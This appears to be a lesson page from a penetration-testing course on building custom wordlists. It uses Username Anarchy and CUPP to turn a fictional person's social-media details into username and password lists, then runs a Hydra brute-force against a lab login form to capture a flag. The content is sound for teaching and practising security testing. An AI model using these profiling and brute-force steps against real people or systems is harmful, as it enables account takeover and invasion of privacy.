
<h1>Custom Wordlists</h1>
<hr/>
<p>While pre-made wordlists like <code>rockyou</code> or <code>SecLists</code> provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catching the right combination. While effective in some scenarios, this approach can be inefficient and time-consuming, especially when targeting specific individuals or organizations with unique password or username patterns.</p>
<p>Consider the scenario where a pentester attempts to compromise the account of "Thomas Edison" at his workplace. A generic username list like <code>xato-net-10-million-usernames-dup.txt</code> is unlikely to yield any meaningful results. Given the potential username conventions enforced by his company, the probability of his specific username being included in such a massive dataset is minimal. These could range from a straightforward first name/last name format to more intricate combinations like last name/first three.</p>
<p>In such cases, the power of custom wordlists comes into play. These meticulously crafted lists, tailored to the specific target and their environment, dramatically increase brute-force attacks' efficiency and success rate. They leverage information gathered from various sources, such as social media profiles, company directories, or even leaked data, to create a focused and highly relevant set of potential passwords and usernames. This laser-sharp approach minimizes wasted effort and maximizes the chances of cracking the target account.</p>
<h2>Username Anarchy</h2>
<p>Even when dealing with a seemingly simple name like "Jane Smith," manual username generation can quickly become a convoluted endeavor. While the obvious combinations like <code>jane</code>, <code>smith</code>, <code>janesmith</code>, <code>j.smith</code>, or <code>jane.s</code> may seem adequate, they barely scratch the surface of the potential username landscape.</p>
<p>Human creativity knows no bounds, and usernames often become a canvas for personal expression. Jane could seamlessly weave in her middle name, birth year, or a cherished hobby, leading to variations like <code>janemarie</code>, <code>smithj87</code>, or <code>jane_the_gardener</code>. The allure of <code>leetspeak</code>, where letters are replaced with numbers or symbols, could manifest in usernames like <code>j4n3</code>, <code>5m1th</code>, or <code>j@n3_5m1th</code>. Her passion for a particular book, movie, or band might inspire usernames like <code>winteriscoming</code>, <code>potterheadjane</code>, or <code>smith_beatles_fan</code>.</p>
<p>This is where <code>Username Anarchy</code> shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:</p>
<pre><code class="language-shell-session">[!bash!]$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
</code></pre>
<p>First, install ruby, and then pull the <code>Username Anarchy</code> git to get the script:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt install ruby -y
[!bash!]$ git clone https://github.com/urbanadventurer/username-anarchy.git
[!bash!]$ cd username-anarchy
</code></pre>
<p>Next, execute it with the target's first and last names. This will generate possible username combinations.</p>
<pre><code class="language-shell-session">[!bash!]$ ./username-anarchy Jane Smith &gt; jane_smith_usernames.txt
</code></pre>
<p>Upon inspecting <code>jane_smith_usernames.txt</code>, you'll encounter a diverse array of usernames, encompassing:</p>
<ul>
<li>Basic combinations: <code>janesmith</code>, <code>smithjane</code>, <code>jane.smith</code>, <code>j.smith</code>, etc.</li>
<li>Initials: <code>js</code>, <code>j.s.</code>, <code>s.j.</code>, etc.</li>
<li>etc</li>
</ul>
<p>This comprehensive list, tailored to the target's name, is valuable in a brute-force attack.</p>
<h2>CUPP</h2>
<p>With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where <code>CUPP</code> (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.</p>
<p>Let's continue our exploration with Jane Smith. We've already employed <code>Username Anarchy</code> to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.</p>
<p>The efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?</p>
<ul>
<li>
<code>Social Media</code>: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.</li>
<li>
<code>Company Websites</code>: Jane's current or past employers' websites might list her name, position, and even her professional bio, offering insights into her work life.</li>
<li>
<code>Public Records</code>: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.</li>
<li>
<code>News Articles and Blogs</code>: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.</li>
</ul>
<p>OSINT will be a goldmine of information for CUPP. Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. For example, let's say you have put together this profile based on Jane Smith's Facebook postings.</p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Details</th>
</tr>
</thead>
<tbody>
<tr>
<td>Name</td>
<td>Jane Smith</td>
</tr>
<tr>
<td>Nickname</td>
<td>Janey</td>
</tr>
<tr>
<td>Birthdate</td>
<td>December 11, 1990</td>
</tr>
<tr>
<td>Relationship Status</td>
<td>In a relationship with Jim</td>
</tr>
<tr>
<td>Partner's Name</td>
<td>Jim (Nickname: Jimbo)</td>
</tr>
<tr>
<td>Partner's Birthdate</td>
<td>December 12, 1990</td>
</tr>
<tr>
<td>Pet</td>
<td>Spot</td>
</tr>
<tr>
<td>Company</td>
<td>AHI</td>
</tr>
<tr>
<td>Interests</td>
<td>Hackers, Pizza, Golf, Horses</td>
</tr>
<tr>
<td>Favorite Colors</td>
<td>Blue</td>
</tr>
</tbody>
</table>
<p>CUPP will then take your inputs and create a comprehensive list of potential passwords:</p>
<ul>
<li>Original and Capitalized: <code>jane</code>, <code>Jane</code>
</li>
<li>Reversed Strings: <code>enaj</code>, <code>enaJ</code>
</li>
<li>Birthdate Variations: <code>jane1994</code>, <code>smith2708</code>
</li>
<li>Concatenations: <code>janesmith</code>, <code>smithjane</code>
</li>
<li>Appending Special Characters: <code>jane!</code>, <code>smith@</code>
</li>
<li>Appending Numbers: <code>jane123</code>, <code>smith2024</code>
</li>
<li>Leetspeak Substitutions: <code>j4n3</code>, <code>5m1th</code>
</li>
<li>Combined Mutations: <code>Jane1994!</code>, <code>smith2708@</code>
</li>
</ul>
<p>This process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve. This focused approach dramatically increases the odds of success in our password-cracking endeavors.</p>
<p>If you're using Pwnbox, CUPP is likely pre-installed. Otherwise, install it using:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt install cupp -y
</code></pre>
<p>Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:</p>
<pre><code class="language-shell-session">[!bash!]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | <a class="__cf_email__" data-cfemail="3c560c4e5b5d527c4e59515348591159444c5053554812534e5b" href="/cdn-cgi/l/email-protection">[email protected]</a> ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

&gt; First Name: Jane
&gt; Surname: Smith
&gt; Nickname: Janey
&gt; Birthdate (DDMMYYYY): 11121990


&gt; Partners) name: Jim
&gt; Partners) nickname: Jimbo
&gt; Partners) birthdate (DDMMYYYY): 12121990


&gt; Child's name:
&gt; Child's nickname:
&gt; Child's birthdate (DDMMYYYY):


&gt; Pet's name: Spot
&gt; Company name: AHI


&gt; Do you want to add some key words about the victim? Y/[N]: y
&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
&gt; Do you want to add special chars at the end of words? Y/[N]: y
&gt; Do you want to add some random numbers at the end of words? Y/[N]:y
&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
</code></pre>
<p>We now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.</p>
<ul>
<li>Minimum Length: 6 characters</li>
<li>Must Include:
<ul>
<li>At least one uppercase letter</li>
<li>At least one lowercase letter</li>
<li>At least one number</li>
<li>At least two special characters (from the set <code>!@#$%^&amp;*</code>)</li>
</ul>
</li>
</ul>
<p>As we did earlier, we can use grep to filter that password list to match that policy:</p>
<pre><code class="language-shell-session">[!bash!]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&amp;*].*){2,}' &gt; jane-filtered.txt
</code></pre>
<p>This command efficiently filters <code>jane.txt</code> to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in <code>jane-filtered.txt</code>.</p>
<p>Use the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.</p>
<pre><code class="language-shell-session">[!bash!]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&amp;password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&amp;password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
</code></pre>
<p>Once Hydra has completed the attack, log into the website using the discovered credentials and retrieve the flag.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="2674"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> After successfully brute-forcing, and then logging into the target, what is the full flag you find?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2674" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2674">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2674" id="btnAnswer2674">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
